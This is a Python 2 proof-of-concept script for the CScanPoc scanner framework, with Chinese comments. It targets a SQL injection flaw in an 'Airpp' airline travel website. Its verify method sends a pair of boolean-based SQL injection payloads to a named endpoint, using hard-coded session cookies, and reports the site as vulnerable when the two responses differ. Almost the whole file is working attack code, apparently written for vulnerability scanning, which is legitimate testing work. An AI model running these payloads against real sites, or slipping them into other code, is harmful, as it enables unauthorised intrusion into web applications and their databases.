# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Airpp_0101' # 平台漏洞编号
    name = '航空系统网站存在SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-06-20'  # 漏洞公布时间
    desc = '''模版漏洞描述
    航空系统网站存在SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=205076
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Airpp'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '355d0b9b-43db-4854-b78a-a2441fb57fb7' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-26' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/pptravel/proFrontManageAction!findProByParam.action"
            payload = "pname=-1' OR 1=1 AND 996=996 OR 'oi2HYvpE'='&scores=1&typeid="
            payload1 = "pname=-1' OR 1=1 AND 996=997 OR 'oi2HYvpE'='&scores=1&typeid="
            headers = {
                "Content-Length": "89",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
                "Cookie": "JSESSIONID=E2737DF255042B15594A3F75B1CB9682.tomcat1; JSESSIONID=E2737DF255042B15594A3F75B1CB9682.tomcat1; Hm_lvt_4060872cc09bf10b0082de626e535d51=1461809370,1461809527,1461809606,1461809870; Hm_lpvt_4060872cc09bf10b0082de626e535d51=1461809870; Clients_IPAddress=%u9655%u897F%u7701%2C%u897F%u5B89%u5E02; HMACCOUNT=15388A95F027CE2A; ASPSESSIONIDSQRBSRRA=NJEGFGIANMPJMIBLKPDLGLLD; ASPSESSIONIDCCDBCSTT=KMGGFGIABAANDOCEALCBBMJJ; __qc_wId=434; pgv_pvid=8689421847",
                "Connection": "Keep-alive",
                "Accept-Encoding": "gzip,deflate",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21",
                "Accept": "*/*"
            }
            _response = requests.post(url, data=payload, headers=headers)
            _response1 = requests.post(url,data=payload1, headers=headers)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
